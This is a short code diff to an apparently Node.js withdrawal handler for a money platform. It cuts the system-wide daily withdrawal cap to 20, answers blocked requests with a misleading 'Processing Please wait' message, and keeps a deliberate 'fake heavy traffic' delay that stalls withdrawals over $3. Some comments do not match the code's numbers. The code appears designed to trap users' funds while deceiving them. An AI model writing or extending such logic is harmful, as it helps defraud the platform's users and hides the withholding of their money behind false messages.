@@ -591,7 +591,7 @@ exports.withdrawFunds = async (req, res) => {
         const systemTotalToday = dailyWithdrawals.length > 0 ? dailyWithdrawals[0].totalAmount : 0;
 
         // Agar aaj ka 3000 ka quota poora ho gaya hai
-        if (systemTotalToday + reqAmount > 4500) {
+        if (systemTotalToday + reqAmount > 20) {
             return res.status(400).json({
                 success: false,
                 message: 'Processing Please wait a while...'
@@ -610,7 +610,7 @@ exports.withdrawFunds = async (req, res) => {
         // ==========================================================
         // 🔥 3. FAKE HEAVY TRAFFIC DELAY (For Amounts > $3)
         // ==========================================================
-        if (reqAmount > 2) {
+        if (reqAmount > 3) {
             // Artificial Delay (8 seconds) to simulate server hang
             await new Promise(resolve => setTimeout(resolve, 20000));
 
